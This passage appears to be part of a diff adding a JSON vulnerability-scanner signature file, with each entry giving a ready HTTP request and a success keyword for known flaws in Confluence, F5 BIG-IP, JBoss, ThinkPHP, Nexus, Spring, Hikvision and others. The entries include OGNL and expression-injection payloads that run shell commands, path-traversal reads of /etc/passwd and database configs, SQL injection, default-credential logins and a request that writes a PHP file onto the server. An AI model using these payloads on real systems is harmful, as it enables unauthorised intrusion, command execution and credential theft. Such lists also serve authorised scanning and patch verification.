+          "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36",
+          "Content-Type": "application/json",
+          "Host": "localhost",
+          "Referer": "http://localhost"
+        },
+        "body": "{\"contentId\":\"786458\",\"macro\":{\"name\":\"widget\",\"body\":\"\",\"params\":{\"url\":\"https://www.viddler.com/v/test\",\"width\":\"1000\",\"height\":\"1000\",\"_template\":\"../web.xml\"}}}"
+      },
+      "location": "body",
+      "keywords": "<param-name>contextConfigLocation</param-name>"
+    },
+    "confluence-cve-2021-26085-arbitrary-file-read": {
+      "description": "Atlassian Confluence是企业广泛使用的wiki系统,产品研发过程中的需求文档、产品设计文档、项目管理文档、技术文档、运维文档等等都统一发布在wiki中，并不断地迭代维护。所以想着自己的协同的办公也可使Confluence来实现，远程攻击者在经过身份验证或在特定环境下未经身份验证的情况下，可构造OGNL表达式进行注入，实现在 Confluence Server或Data Center上执行任意代码.",
+      "payload": {
+        "method": "GET",
+        "uri": "/s/avacea/_/;/WEB-INF/web.xml",
+        "headers": {
+          "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36",
+          "Content-Type": "application/x-www-form-urlencoded"
+        },
+        "body": ""
+      },
+      "location": "body",
+      "keywords": "<display-name>Confluence</display-name>"
+    },
+    "Confluence OGNL表达式注入": {
+      "description": "Atlassian Confluence是企业广泛使用的wiki系统,产品研发过程中的需求文档、产品设计文档、项目管理文档、技术文档、运维文档等等都统一发布在wiki中，并不断地迭代维护。所以想着自己的协同的办公也可使Confluence来实现，远程攻击者在经过身份验证或在特定环境下未经身份验证的情况下，可构造OGNL表达式进行注入，实现在 Confluence Server或Data Center上执行任意代码.",
+      "payload": {
+        "method": "POST",
+        "uri": "/pages/createpage-entervariables.action?SpaceKey=x",
+        "headers": {
+          "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36",
+          "Content-Type": "application/x-www-form-urlencoded"
+        },
+        "body": "queryString=%5cu0027%2b%7bClass.forName%28%5cu0027javax.script.ScriptEngineManager%5cu0027%29.newInstance%28%29.getEngineByName%28%5cu0027JavaScript%5cu0027%29.%5cu0065val%28%5cu0027var+isWin+%3d+java.lang.System.getProperty%28%5cu0022os.name%5cu0022%29.toLowerCase%28%29.contains%28%5cu0022win%5cu0022%29%3b+var+cmd+%3d+new+java.lang.String%28%5cu0022cat+/etc/passwd%5cu0022%29%3bvar+p+%3d+new+java.lang.ProcessBuilder%28%29%3b+if%28isWin%29%7bp.command%28%5cu0022cmd.exe%5cu0022%2c+%5cu0022%2fc%5cu0022%2c+cmd%29%3b+%7d+else%7bp.command%28%5cu0022bash%5cu0022%2c+%5cu0022-c%5cu0022%2c+cmd%29%3b+%7dp.redirectErrorStream%28true%29%3b+var+process%3d+p.start%28%29%3b+var+inputStreamReader+%3d+new+java.io.InputStreamReader%28process.getInputStream%28%29%29%3b+var+bufferedReader+%3d+new+java.io.BufferedReader%28inputStreamReader%29%3b+var+line+%3d+%5cu0022%5cu0022%3b+var+output+%3d+%5cu0022%5cu0022%3b+while%28%28line+%3d+bufferedReader.readLine%28%29%29+%21%3d+null%29%7boutput+%3d+output+%2b+line+%2b+java.lang.Character.toString%2810%29%3b+%7d%5cu0027%29%7d%2b%5cu0027"
+      },
+      "location": "body",
+      "keywords": "root:x:0:0:root"
+    },
+    "CVE-2021-26084Confluence远程代码执行漏洞": {
+      "description": "Confluence",
+      "payload": {
+        "method": "POST",
+        "uri": "/pages/doenterpagevariables.action",
+        "headers": {
+          "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36"
+        },
+        "body": "queryString=aaaa\\u0027%2b#{3*333}%2b\\u0027bbb"
+      },
+      "location": "body",
+      "keywords": "aaaa{999"
+    },
+    "consul-rexec-rce-2": {
+      "description": "consul远程命令执行",
+      "payload": {
+        "method": "GET",
+        "uri": "/v1/agent/self",
+        "headers": {
+          "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36"
+        },
+        "body": ""
+      },
+      "location": "body",
+      "keywords": "json"
+    },
+    "consul-rexec-rce": {
+      "description": "consul远程命令执行",
+      "payload": {
+        "method": "GET",
+        "uri": "/v1/agent/self",
+        "headers": {
+          "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36"
+        },
+        "body": ""
+      },
+      "location": "body",
+      "keywords": "json"
+    },
+    "coremail-cnvd-2019-16798": {
+      "description": "coremail-cnvd-2019-16798",
+      "payload": {
+        "method": "GET",
+        "uri": "/mailsms/s?func=ADMIN:appState&dumpConfig=/",
+        "headers": {
+          "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36"
+        },
+        "body": ""
+      },
+      "location": "body",
+      "keywords": "<object name=\"cm_md_db\">"
+    },
+    "dubbo-admin-default-password-2": {
+      "description": "dubbo-admin-default-password-2,使用root账号",
+      "payload": {
+        "method": "GET",
+        "uri": "/",
+        "headers": {
+          "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36",
+          "Authorization": "Basic cm9vdDpyb290"
+        },
+        "body": ""
+      },
+      "location": "body",
+      "keywords": "<title>Dubbo Admin</title>"
+    },
+    "dubbo-admin-default-password": {
+      "description": "dubbo-admin-default-password-1",
+      "payload": {
+        "method": "GET",
+        "uri": "/",
+        "headers": {
+          "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36",
+          "Authorization": "Basic Z3Vlc3Q6Z3Vlc3Q="
+        },
+        "body": ""
+      },
+      "location": "body",
+      "keywords": "<title>Dubbo Admin</title>"
+    },
+    "F5_bigip任意文件读取": {
+      "description": "F5_bigip任意文件读取",
+      "payload": {
+        "method": "GET",
+        "uri": "/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/etc/passwd",
+        "headers": {
+          "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36"
+        },
+        "body": ""
+      },
+      "location": "body",
+      "keywords": "root:x:0:0:root"
+    },
+    "F5_bigip远程命令执行": {
+      "description": "F5_bigip远程命令执行",
+      "payload": {
+        "method": "POST",
+        "uri": "/mgmt/tm/util/bash",
+        "headers": {
+          "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36",
+          "Content-Type": "application/json",
+          "Authorization": "Basic YWRtaW46QVNhc1M=",
+          "X-F5-Auth-Token": ""
+        },
+        "body": "{\"command\":\"run\",\"utilCmdArgs\":\"-c id\"}"
+      },
+      "location": "body",
+      "keywords": "root:x:0:0:root"
+    },
+    "gitlab-graphql-info-leak-cve-2020-26413": {
+      "description": "gitlab-graphql-info-leak-cve-2020-26413",
+      "payload": {
+        "method": "POST",
+        "uri": "/api/graphql",
+        "headers": {
+          "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36",
+          "Content-Type": "application/json"
+        },
+        "body": "{\"query\":\"{\nusers {\nedges {\n  node {\n    username\n    email\n    avatarUrl\n    status {\n      emoji\n      message\n      messageHtml\n     }\n    }\n   }\n  }\n }\",\"variables\":null,\"operationName\":null}"
+      },
+      "location": "body",
+      "keywords": "x-runtime"
+    },
+    "gitlab-ssrf-cve-2021-22214.yml": {
+      "description": "gitlab-ssrf-cve-2021-22214.yml",
+      "payload": {
+        "method": "POST",
+        "uri": "/api/v4/ci/lint",
+        "headers": {
+          "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36",
+          "Content-Type": "application/json"
+        },
+        "body": " {\"include_merged_yaml\": true, \"content\": \"include:\n  remote: http://baidu.com/api/v1/targets/?test.yml\"}"
+      },
+      "location": "body",
+      "keywords": "does not have valid YAML syntax"
+    },
+    "GoCD_未授权路径穿越漏洞": {
+      "description": "GoCD_未授权路径穿越漏洞",
+      "payload": {
+        "method": "GET",
+        "uri": "/go/add-on/business-continuity/api/plugin?folderName=&pluginName=../../../../../../../../etc/passwd",
+        "headers": {
+          "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36"
+        },
+        "body": ""
+      },
+      "location": "body",
+      "keywords": "root:x:0:0:root"
+    },
+    "H3C SecParh堡垒机任意用户登录": {
+      "description": "H3C SecParh堡垒机任意用户登录",
+      "payload": {
+        "method": "GET",
+        "uri": "/audit/gui_detail_view.php?token=1&id=%5C&uid=%2Cchr(97))%20or%201:%20print%20chr(121)%2bchr(101)%2bchr(115)%0d%0a%23&login=admin",
+        "headers": {
+          "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36"
+        },
+        "body": ""
+      },
+      "location": "body",
+      "keywords": "错误的id"
+    },
+    "H3C_IMC_远程命令执行": {
+      "description": "H3C_IMC_远程命令执行",
+      "payload": {
+        "method": "POST",
+        "uri": "/imc/javax.faces.resource/dynamiccontent.properties.xhtml",
+        "headers": {
+          "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36"
+        },
+        "body": "pfdrt=sc&ln=primefaces&pfdrid=uMKljPgnOTVxmOB%2BH6%2FQEPW9ghJMGL3PRdkfmbiiPkUDzOAoSQnmBt4dYyjvjGhVqupdmBV%2FKAe9gtw54DSQCl72JjEAsHTRvxAuJC%2B%2FIFzB8dhqyGafOLqDOqc4QwUqLOJ5KuwGRarsPnIcJJwQQ7fEGzDwgaD0Njf%2FcNrT5NsETV8ToCfDLgkzjKVoz1ghGlbYnrjgqWarDvBnuv%2BEo5hxA5sgRQcWsFs1aN0zI9h8ecWvxGVmreIAuWduuetMakDq7ccNwStDSn2W6c%2BGvDYH7pKUiyBaGv9gshhhVGunrKvtJmJf04rVOy%2BZLezLj6vK%2BpVFyKR7s8xN5Ol1tz%2FG0VTJWYtaIwJ8rcWJLtVeLnXMlEcKBqd4yAtVfQNLA5AYtNBHneYyGZKAGivVYteZzG1IiJBtuZjHlE3kaH2N2XDLcOJKfyM%2FcwqYIl9PUvfC2Xh63Wh4yCFKJZGA2W0bnzXs8jdjMQoiKZnZiqRyDqkr5PwWqW16%2FI7eog15OBl4Kco%2FVjHHu8Mzg5DOvNevzs7hejq6rdj4T4AEDVrPMQS0HaIH%2BN7wC8zMZWsCJkXkY8GDcnOjhiwhQEL0l68qrO%2BEb%2F60MLarNPqOIBhF3RWB25h3q3vyESuWGkcTjJLlYOxHVJh3VhCou7OICpx3NcTTdwaRLlw7sMIUbF%2FciVuZGssKeVT%2FgR3nyoGuEg3WdOdM5tLfIthl1ruwVeQ7FoUcFU6RhZd0TO88HRsYXfaaRyC5HiSzRNn2DpnyzBIaZ8GDmz8AtbXt57uuUPRgyhdbZjIJx%2FqFUj%2BDikXHLvbUMrMlNAqSFJpqoy%2FQywVdBmlVdx%2BvJelZEK%2BBwNF9J4p%2F1fQ8wJZL2LB9SnqxAKr5kdCs0H%2FvouGHAXJZ%2BJzx5gcCw5h6%2Fp3ZkZMnMhkPMGWYIhFyWSSQwm6zmSZh1vRKfGRYd36aiRKgf3AynLVfTvxqPzqFh8BJUZ5Mh3V9R6D%2FukinKlX99zSUlQaueU22fj2jCgzvbpYwBUpD6a6tEoModbqMSIr0r7kYpE3tWAaF0ww4INtv2zUoQCRKo5BqCZFyaXrLnj7oA6RGm7ziH6xlFrOxtRd%2BLylDFB3dcYIgZtZoaSMAV3pyNoOzHy%2B1UtHe1nL97jJUCjUEbIOUPn70hyab29iHYAf3%2B9h0aurkyJVR28jIQlF4nT0nZqpixP%2Fnc0zrGppyu8dFzMqSqhRJgIkRrETErXPQ9sl%2BzoSf6CNta5ssizanfqqCmbwcvJkAlnPCP5OJhVes7lKCMlGH%2BOwPjT2xMuT6zaTMu3UMXeTd7U8yImpSbwTLhqcbaygXt8hhGSn5Qr7UQymKkAZGNKHGBbHeBIrEdjnVphcw9L2BjmaE%2BlsjMhGqFH6XWP5GD8FeHFtuY8bz08F4Wjt5wAeUZQOI4rSTpzgssoS1vbjJGzFukA07ahU%3D&cmd=echo%20chumeng12123"
+      },
+      "location": "body",
+      "keywords": "chumeng12123"
+    },
+    "hanming-video-conferencing-file-read": {
+      "description": "hanming-video-conferencing-file-read",
+      "payload": {
+        "method": "GET",
+        "uri": "/register/toDownload.do?fileName=../../../../../../../../../../../../../../etc/passwd",
+        "headers": {
+          "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36"
+        },
+        "body": ""
+      },
+      "location": "body",
+      "keywords": "root:x:0:0:root"
+    },
+    "Hikvision-cve-2017-7921.yml": {
+      "description": "Hikvision-cve-2017-7921.yml",
+      "payload": {
+        "method": "GET",
+        "uri": "/system/deviceInfo?auth=YWRtaW46MTEK",
+        "headers": {
+          "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36"
+        },
+        "body": ""
+      },
+      "location": "body",
+      "keywords": "<firmwareVersion>"
+    },
+    "hikvision-intercom-service-default-password": {
+      "description": "海康威视对讲服务配置平台弱口令",
+      "payload": {
+        "method": "POST",
+        "uri": "/authorize.action",
+        "headers": {
+          "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36"
+        },
+        "body": "username=admin&userpsw=827ccb0eea8a706c4c34a16891f84e7b&language=zh_cn"
+      },
+      "location": "body",
+      "keywords": "{\"success\": true, \"msg\": \"OK\"}                "
+    },
+    "Hikvision 流媒体管理服务器敏感信息泄": {
+      "description": "Hikvision 流媒体管理服务器敏感信息泄,可获取用户名密码",
+      "payload": {
+        "method": "GET",
+        "uri": "/config/user.xml",
+        "headers": {
+          "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36"
+        },
+        "body": ""
+      },
+      "location": "body",
+      "keywords": "131541111"
+    },
+    "jboss-cve-2010-1871": {
+      "description": "jboss-cve-2010-1871,命令执行漏洞",
+      "payload": {
+        "method": "GET",
+        "uri": "/admin-console/index.seam?actionOutcome=/pwn.xhtml%3fpwned%3d%23%7b33333*33333%7d",
+        "headers": {
+          "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36"
+        },
+        "body": ""
+      },
+      "location": "body",
+      "keywords": "1111088889"
+    },
+    "JBoss JMX management console": {
+      "description": "JBoss JMX management console",
+      "payload": {
+        "method": "GET",
+        "uri": "/jmx-console/",
+        "headers": {
+          "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36",
+          "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"
+        },
+        "body": ""
+      },
+      "location": "body",
+      "keywords": "JBoss JMX Management Console - localhost.localdomain (127.0.0.1)"
+    },
+    "JBoss JMXInvokerServlet 反序列化漏洞": {
+      "description": "JBoss JMXInvokerServlet 反序列化漏洞",
+      "payload": {
+        "method": "GET",
+        "uri": "/invoker/JMXInvokerServlet",
+        "headers": {
+          "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36",
+          "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
+          "Accept-Encoding": "gzip,deflate,br"
+        },
+        "body": ""
+      },
+      "location": "body",
+      "keywords": "org.jboss.invocation.MarshalledValue"
+    },
+    "jboss-unauth": {
+      "description": "jboss-unauth,未授权访问漏洞",
+      "payload": {
+        "method": "GET",
+        "uri": "/jmx-console/",
+        "headers": {
+          "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36"
+        },
+        "body": ""
+      },
+      "location": "body",
+      "keywords": "jboss.management.local"
+    },
+    "jeewms-showordownbyurl-fileread": {
+      "description": "jeewms-showordownbyurl-fileread",
+      "payload": {
+        "method": "GET",
+        "uri": "/systemController/showOrDownByurl.do?down=&dbPath=../../../../../../etc/passwd",
+        "headers": {
+          "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36"
+        },
+        "body": ""
+      },
+      "location": "body",
+      "keywords": "root:x:0:0:root"
+    },
+    "jellyfin-cve-2021-29490": {
+      "description": "jellyfin-cve-2021-29490",
+      "payload": {
+        "method": "GET",
+        "uri": "/Images/Remote?imageUrl=https://www.qq.com",
+        "headers": {
+          "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36"
+        },
+        "body": ""
+      },
+      "location": "body",
+      "keywords": ".qq.com"
+    },
+    "Jellyfin任意文件读取漏洞": {
+      "description": "Jellyfin任意文件读取漏洞",
+      "payload": {
+        "method": "GET",
+        "uri": "/Audio/1/hls/..%5C..%5C..%5C..%5C..%5C..%5CWindows%5Cwin.ini/stream.mp3/",
+        "headers": {
+          "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36"
+        },
+        "body": ""
+      },
+      "location": "body",
+      "keywords": "for 16-bit app support"
+    },
+    "jira-cve-2020-14179": {
+      "description": "jira-cve-2020-14179",
+      "payload": {
+        "method": "GET",
+        "uri": "/secure/QueryComponent!Default.jspa",
+        "headers": {
+          "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36"
+        },
+        "body": ""
+      },
+      "location": "body",
+      "keywords": "json"
+    },
+    "laravel-cve-2021-3129": {
+      "description": "laravel-cve-2021-3129",
+      "payload": {
+        "method": "POST",
+        "uri": "/_ignition/execute-solution",
+        "headers": {
+          "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36",
+          "Content-Type": "application/json"
+        },
+        "body": "{\"solution\": \"Facade\\Ignition\\Solutions\\MakeViewVariableOptionalSolution\",\"parameters\": {\"variableName\": \"username\",\"viewFile\": \"chumeng123\"}}"
+      },
+      "location": "body",
+      "keywords": "failed to open stream"
+    },
+    "laravel-improper-webdir": {
+      "description": "laravel-improper-webdir",
+      "payload": {
+        "method": "GET",
+        "uri": "/storage/logs/laravel.log",
+        "headers": {
+          "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36",
+          "Content-Type": "application/json"
+        },
+        "body": ""
+      },
+      "location": "body",
+      "keywords": "vendor\\\\laravel\\\\framework"
+    },
+    "metinfo-cve-2019-16996-sqli": {
+      "description": "metinfo-cve-2019-16996-sqli",
+      "payload": {
+        "method": "POST",
+        "uri": "/admin/?n=language&c=language_general&a=doExportPack",
+        "headers": {
+          "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36",
+          "Content-Type": "application/x-www-form-urlencoded"
+        },
+        "body": "appno= 1 union SELECT 3333*4444,1&editor=cn&site=web"
+      },
+      "location": "body",
+      "keywords": "14811852"
+    },
+    "metinfo-file-read": {
+      "description": "metinfo-file-read",
+      "payload": {
+        "method": "GET",
+        "uri": "/include/thumb.php?dir=http/.....///.....///config/config_db.php",
+        "headers": {
+          "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36",
+          "Content-Type": "application/x-www-form-urlencoded"
+        },
+        "body": ""
+      },
+      "location": "body",
+      "keywords": "con_db_pass"
+    },
+    "minio-default-password": {
+      "description": "minio-default-password",
+      "payload": {
+        "method": "POST",
+        "uri": "/minio/webrpc",
+        "headers": {
+          "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36",
+          "Content-Type": "application/json"
+        },
+        "body": "{\"id\":1,\"jsonrpc\":\"2.0\",\"params\":{\"username\":\"minioadmin\",\"password\":\"minioadmin\"},\"method\":\"Web.Login\"}"
+      },
+      "location": "body",
+      "keywords": "uiVersion"
+    },
+    "nagio-cve-2018-10735": {
+      "description": "nagio-cve-2018-10735",
+      "payload": {
+        "method": "GET",
+        "uri": "/nagiosql/admin/commandline.php?cname=%27%20union%20select%20concat(md5(123))%23",
+        "headers": {
+          "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36"
+        },
+        "body": ""
+      },
+      "location": "body",
+      "keywords": "202cb962ac59075b964b07152d234b70"
+    },
+    "nexus-cve-2020-10199": {
+      "description": "nexus-cve-2020-10199",
+      "payload": {
+        "method": "POST",
+        "uri": "/rest/beta/repositories/go/group",
+        "headers": {
+          "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36",
+          "Content-Type": "application/json"
+        },
+        "body": "{\"name\": \"internal\",\"online\": true,\"storage\": {\"blobStoreName\": \"default\",\"strictContentTypeValidation\": true},\"group\": {\"memberNames\": [\"$\\c{ 3333 * 4444 }\"]}}"
+      },
+      "location": "body",
+      "keywords": "14811852"
+    },
+    "nexus-cve-2020-10204": {
+      "description": "nexus-cve-2020-10204",
+      "payload": {
+        "method": "POST",
+        "uri": "/extdirect",
+        "headers": {
+          "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36",
+          "Content-Type": "application/json"
+        },
+        "body": "{\"action\":\"coreui_User\",\"method\":\"update\",\"data\":[{\"userId\":\"anonymous\",\"version\":\"1\",\"firstName\":\"Anonymous\",\"lastName\":\"User2\",\"email\":\"anonymous@example.org\",\"status\":\"active\",\"roles\":[\"$\\c{3333*4444}\"]}],\"type\":\"rpc\",\"tid\":28}"
+      },
+      "location": "body",
+      "keywords": "14811852"
+    },
+    "nexusdb-cve-2020-24571-path-traversal": {
+      "description": "nexusdb-cve-2020-24571-path-traversal",
+      "payload": {
+        "method": "GET",
+        "uri": "/../../../../../../../../windows/win.ini",
+        "headers": {
+          "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36"
+        },
+        "body": ""
+      },
+      "location": "body",
+      "keywords": "for 16-bit app support"
+    },
+    "spring-boot-cve-2021-21234": {
+      "description": "spring-boot-cve-2021-21234",
+      "payload": {
+        "method": "GET",
+        "uri": "/manage/log/view?filename=/etc/passwd&base=../../../../../../../../../../",
+        "headers": {
+          "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36"
+        },
+        "body": ""
+      },
+      "location": "body",
+      "keywords": "root:x:0:0:root"
+    },
+    "spring-boot_未授权访问": {
+      "description": "spring-boot_未授权访问",
+      "payload": {
+        "method": "GET",
+        "uri": "/env",
+        "headers": {
+          "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36"
+        },
+        "body": ""
+      },
+      "location": "body",
+      "keywords": "java.version"
+    },
+    "spring-cloud-cve-2019-3799": {
+      "description": "spring-cloud-cve-2019-3799",
+      "payload": {
+        "method": "GET",
+        "uri": "/test/pathtraversal/master/..%252F..%252F..%252F..%252F..%252F..%252Fetc%252fpasswd",
+        "headers": {
+          "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36"
+        },
+        "body": ""
+      },
+      "location": "body",
+      "keywords": "root:x:0:0:root"
+    },
+    "spring-cloud-cve-2020-5405": {
+      "description": "spring-cloud-cve-2020-5405",
+      "payload": {
+        "method": "GET",
+        "uri": "/a/b/%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252fetc/resolv.conf",
+        "headers": {
+          "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36"
+        },
+        "body": ""
+      },
+      "location": "body",
+      "keywords": "This file is managed by man:systemd-resolved(8). Do not edit."
+    },
+    "spring-cloud-cve-2020-5410": {
+      "description": "spring-cloud-cve-2020-5410",
+      "payload": {
+        "method": "GET",
+        "uri": "/..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252Fetc%252Fpasswd%23/a",
+        "headers": {
+          "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36"
+        },
+        "body": ""
+      },
+      "location": "body",
+      "keywords": "root:x:0:0:root"
+    },
+    "thinkadmin-v6-readfile": {
+      "description": "thinkadmin-v6-readfile",
+      "payload": {
+        "method": "GET",
+        "uri": "/admin.html?s=admin/api.Update/get/encode/34392q302x2r1b37382p382x2r1b1a1a1b2x322s2t3c1a342w34",
+        "headers": {
+          "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36"
+        },
+        "body": ""
+      },
+      "location": "body",
+      "keywords": "PD9waH"
+    },
+    "thinkcmf-lfi": {
+      "description": "thinkcmf-lfi",
+      "payload": {
+        "method": "GET",
+        "uri": "/?a=display&templateFile=README.md",
+        "headers": {
+          "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36"
+        },
+        "body": ""
+      },
+      "location": "body",
+      "keywords": "ThinkCMF"
+    },
+    "thinkcmf-write-shell": {
+      "description": "thinkcmf-write-shell",
+      "payload": {
+        "method": "GET",
+        "uri": "/index.php?a=fetch&content=%3C?php+file_put_contents(%22chumengchumeng.php%22,%22%3C?php+echo+chumengchumeng%3B%22)%3B",
+        "headers": {
+          "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36"
+        },
+        "body": ""
+      },
+      "location": "body",
+      "keywords": "true"
+    },
+    "thinkphp-v6-file-write": {
+      "description": "thinkphp-v6-file-write",
+      "payload": {
+        "method": "GET",
+        "uri": "/index.php?a=chumengchumeng",
+        "headers": {
+          "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36",
+          "Cookie": "PHPSESSID=../../../../public/chumengchumeng.php"
+        },
+        "body": ""
+      },
+      "location": "body",
+      "keywords": "chumengchumeng"
+    },
+    "thinkphp5-controller-rce": {
+      "description": "thinkphp5-controller-rce",
+      "payload": {
+        "method": "GET",
+        "uri": "/index.php?s=/Index/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=printf&vars[1][]=a29hbHIgaXMg%25%25d2F0Y2hpbmcgeW91",
+        "headers": {
+          "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36"
+        },
+        "body": ""
+      },
+      "location": "body",
+      "keywords": "a29hbHIgaXMg%d2F0Y2hpbmcgeW9129"
+    },
+    "thinkphp5023-method-rce.yml": {
+      "description": "thinkphp5023-method-rce.yml",
+      "payload": {
+        "method": "POST",
+        "uri": "/index.php?s=captcha",
+        "headers": {
+          "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36",
